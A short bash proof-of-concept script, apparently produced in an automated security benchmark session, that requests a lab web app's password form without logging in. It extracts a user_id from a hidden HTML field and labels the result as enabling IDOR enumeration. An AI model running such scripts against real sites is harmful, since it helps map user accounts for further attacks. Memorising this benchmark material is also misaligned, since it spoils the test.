#!/bin/bash
# POC: Demonstrates information disclosure of user_id in password form HTML. Shows how an unauthenticated attacker can access the password form and extract the user_id from the hidden form field.
# Target: ./repo
# Created: 2025-11-04T14:49:03.240Z
# Session: benchmark-XBEN-027-24-mhknopkv

# Information Disclosure POC - User ID Exposed in Password Form HTML
# This script demonstrates that unauthenticated users can access the password form
# and extract the user_id from hidden form fields

TARGET_URL="${1:-http://localhost:8080}"
TEST_USERNAME="test"

echo "[*] Information Disclosure POC - User ID Extraction from Password Form"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Access the password form without authentication
echo "[+] Step 1: Accessing password form for username: $TEST_USERNAME"
RESPONSE=$(curl -s -X GET "$TARGET_URL/password/$TEST_USERNAME")

# Check if we got a response
if [ -z "$RESPONSE" ]; then
    echo "[-] Failed to access the endpoint"
    exit 1
fi

# Step 2: Extract user_id from the hidden form field
echo "[+] Step 2: Extracting user_id from HTML form"
USER_ID=$(echo "$RESPONSE" | grep -oP 'name="user_id"\s+value="\K[^"]+' | head -1)

if [ -z "$USER_ID" ]; then
    echo "[-] Could not extract user_id from response"
    echo "[*] Raw response:"
    echo "$RESPONSE"
    exit 1
fi

echo "[!] VULNERABILITY CONFIRMED:"
echo "[!] Username: $TEST_USERNAME"
echo "[!] Exposed User ID: $USER_ID"
echo ""

# Step 3: Verify the user_id is in hidden field
echo "[+] Step 3: Confirming user_id is in hidden form field"
if echo "$RESPONSE" | grep -q 'type="hidden".*name="user_id"'; then
    echo "[!] Confirmed: user_id is in a hidden form field (still visible in HTML source)"
else
    echo "[-] user_id field type is not 'hidden'"
fi

# Step 4: Show the vulnerable HTML snippet
echo ""
echo "[+] Step 4: Vulnerable HTML snippet:"
echo "$RESPONSE" | grep -A 1 'name="user_id"' | head -2

echo ""
echo "[!] Impact: Unauthenticated attacker can map username '$TEST_USERNAME' to user_id '$USER_ID'"
echo "[!] This allows: IDOR enumeration, user ID mapping, targeted exploitation"
exit 0